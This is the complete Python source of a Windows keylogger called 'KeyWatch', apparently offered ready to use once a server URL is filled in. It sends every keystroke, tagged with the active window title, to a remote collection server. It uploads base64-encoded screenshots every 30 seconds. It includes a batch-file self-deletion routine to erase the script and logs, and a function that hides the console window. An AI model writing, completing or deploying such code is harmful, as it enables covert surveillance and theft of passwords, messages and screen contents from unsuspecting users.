import os
import time
import ctypes
import io
import base64
import threading
import logging
import requests
import win32gui
from pynput import keyboard
from PIL import ImageGrab

# ─────────────────────────────────────────────
#  CONFIGURATION — update BASE_URL before use
# ─────────────────────────────────────────────
BASE_URL       = "https://your-app.onrender.com"  # ← Replace with your Render URL
SERVER_URL     = f"{BASE_URL}/log"
SCREENSHOT_URL = f"{BASE_URL}/screenshot"

LOG_DIR  = "keylogger_logs"
LOG_FILE = os.path.join(LOG_DIR, "keylogger.log")

SCREENSHOT_INTERVAL = 30   # seconds between screenshots (set 0 to disable)
SELF_DELETE_TIME    = 3600 # seconds before self-delete (set 0 to disable)

# ─────────────────────────────────────────────
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename=LOG_FILE,
)

start_time = time.time()
running    = True


# ── Helpers ──────────────────────────────────

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"


def send_keystroke(key_str: str, window: str):
    """Send a single keystroke to the Flask server in real-time."""
    payload = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "window":    window,
        "key":       key_str,
    }
    try:
        requests.post(SERVER_URL, json=payload, timeout=3)
    except requests.exceptions.RequestException as e:
        logging.warning(f"Failed to send keystroke: {e}")


def send_screenshot():
    """Capture screenshot, encode as base64 JPEG, send to server (no local file)."""
    try:
        img = ImageGrab.grab()

        # Resize to max 1280px wide to keep payload manageable
        max_width = 1280
        if img.width > max_width:
            ratio = max_width / img.width
            img = img.resize((max_width, int(img.height * ratio)))

        # Encode in memory as JPEG
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")

        payload = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "window":    get_active_window(),
            "image":     b64,
        }
        requests.post(SCREENSHOT_URL, json=payload, timeout=10)
        logging.info("Screenshot sent to server")
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")


def format_key(key) -> str:
    try:
        if hasattr(key, "char") and key.char is not None:
            return key.char
        return str(key).replace("Key.", "")
    except AttributeError:
        return str(key).replace("Key.", "")


# ── Keyboard listener ─────────────────────────

def on_press(key):
    global running
    key_str = format_key(key)
    window  = get_active_window()
    send_keystroke(key_str, window)

    if key == keyboard.Key.esc:
        running = False
        return False  # Stop listener


def on_release(key):
    pass


# ── Background monitor thread ─────────────────

def monitor_thread():
    global running
    while running:
        try:
            if SCREENSHOT_INTERVAL > 0:
                send_screenshot()

            if SELF_DELETE_TIME > 0 and time.time() - start_time > SELF_DELETE_TIME:
                self_delete()
                break

            time.sleep(SCREENSHOT_INTERVAL if SCREENSHOT_INTERVAL > 0 else 10)
        except Exception as e:
            logging.error(f"Monitor thread error: {e}")


def self_delete():
    global running
    script_path = os.path.abspath(__file__)
    logging.info("Self-deleting script...")
    try:
        bat = os.path.join(os.environ.get("TEMP", "."), "kw_cleanup.bat")
        with open(bat, "w") as f:
            f.write(f"""@echo off
timeout /t 2 /nobreak > nul
del "{script_path}"
rmdir /s /q "{LOG_DIR}"
del "%~f0"
""")
        os.system(f'start "" "{bat}"')
        running = False
    except Exception as e:
        logging.error(f"Self-delete failed: {e}")


def enable_stealth():
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except Exception:
        pass


# ── Entry point ───────────────────────────────

if __name__ == "__main__":
    logging.info("KeyWatch agent started")
    print(f"KeyWatch started → keystrokes → {SERVER_URL}")
    print(f"KeyWatch started → screenshots → {SCREENSHOT_URL}")
    print("Press ESC to stop.\n")

    # enable_stealth()  # Uncomment to hide console window

    monitor = threading.Thread(target=monitor_thread, daemon=True)
    monitor.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    logging.info("KeyWatch agent stopped")
    print("KeyWatch stopped.")